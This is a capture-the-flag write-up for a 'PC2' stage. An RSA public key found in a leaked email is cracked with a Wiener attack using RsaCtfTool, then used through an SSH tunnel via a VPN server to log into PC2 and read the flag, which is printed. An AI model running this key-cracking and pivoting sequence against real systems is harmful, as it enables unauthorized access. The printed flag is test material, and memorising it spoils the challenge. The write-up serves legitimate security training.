# PC2

1. **Resume From [VPN Server](<../4_VPN server>)**
2. **Email Server, rsa Key: [SSH RSA](../2_mail_server/08-store0/4/msg/0/257-2.msg)**

    ```text
    سلام
    لطفا کلید عمومی مرا در سرور اضافه کنید تا بتوانم بدون پسورد به آن وصل شوم.

    ssh-rsa AAAAB3NzaC1yc2EAAAEAXNQtOdb1y7O+7egOkNhfL37yUDDJ+nLnYBn0CWkIS0pI/B3kaX+UlMebbW6BEWvpqlMXuVhMMEOFwTKDNpNoQya8egwZm1wLVGyjB46FtKCb41qax7TEEq+Dw9/xGaKWCHii7lTNyt6fofB4vp0FXo0jZxGstGp3vmbirXoHnGShMw0RRPA6Cii2laqBGmFyIlFbl9iMDkZOA2Q+rl0yERqeaIK90epCluwUy0tyYqDlfxAysDBwhkhhB9fSr2+IE9x6ZKa2eRkY44RXYLvEpCEZUJ5kV1c5Xi+V/3nUscPq2gTXt++8uILoR23Pn55gm2RJFj83d846rcT6GAuvbQAAAQBfoXkf+My9/MadpBr99ZD/re4yVW36jl+RfGpScBRoMX5NOY3MHra24scoVhZdP4xcEtHzkmLw4EaoWQYcQNbQKH9zZpHzpQ2mCw4RLzBJrvaf+8UIYkOLZndlJKnQVdIRrYjTHoMsQGg7zMrUIdjtMACmhRlJ7FmwxPb2xd8mWksrt8h6hI0m1Vlk8sTgNkpUcHDxYmy5ppLGDv0QlJ6VRncNmlvA2E7mDe/8LNvy1scKatDCnZsMkfdtdr2iNC9A/3tcJxgcNYP59pi2ELVaL51XMEpy5DPKArnikftC+GWhO2GsffKFo+6XQ4YfTomMyAdwjITMnNuRol/lXjf/
    ```

3. **Wiener Attack**

    - [YouTube Video](https://www.youtube.com/watch?v=M-yg0vbrAOk)
    - [CryptoHack Guide](https://cryptohack.gitbook.io/cryptobook/untitled/low-private-component-attacks/wieners-attack)

4. **Get [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) into: [RsaCtfTool](./04-RsaCtfTool/)**
5. **Running Rsa Ctf Tools**

    ```shell
    python3 -m pip install -r 04-RsaCtfTool/requirements.txt
    python3 04-RsaCtfTool/RsaCtfTool.py --publickey 02-ssh-rsa.rezaee.pub --attack wiener --private --output 05-rsa.rezaee.priv
    ```

6. **Change Access Permissions:**

    ```shell
    chmod 600 05-rsa.rezaee.priv
    ```

7. **SSH into VPN Server**

    ```shell
    ssh -i ./id_ed25519 -p 2200 vpn_user@172.16.3.64
    ```

8. **Get IP of PC2**

    ```shell
    ping -c 1 pc2
    ```

9. **SSH Tunnel Through VPN Server**

    ```text
       <Hacker>-------(SSH Tunnel)-------<VPN Server>--------------<PC2>
       |                                                          |
        ----------------------(SSH Connection)--------------------
    0.0.0.0:7777                                            10.233.27.37:22
    ```

    ```shell
    # In a New Terminal
    ssh -N -i ./id_ed25519 -p 2200 -L 0.0.0.0:7777:10.233.27.37:22 vpn_user@172.16.3.64
    ```

10. **Connect to PC2 through Tunnel**

    ```shell
    ssh -p 7777 -i 05-rsa.rezaee.priv rezaee@127.0.0.1
    ```

11. **Read Flag:**

    ```shell
    cat /flag.txt
    ```

    `MAZAPA_dedcf160a1253afd73918666b0c6edb3`
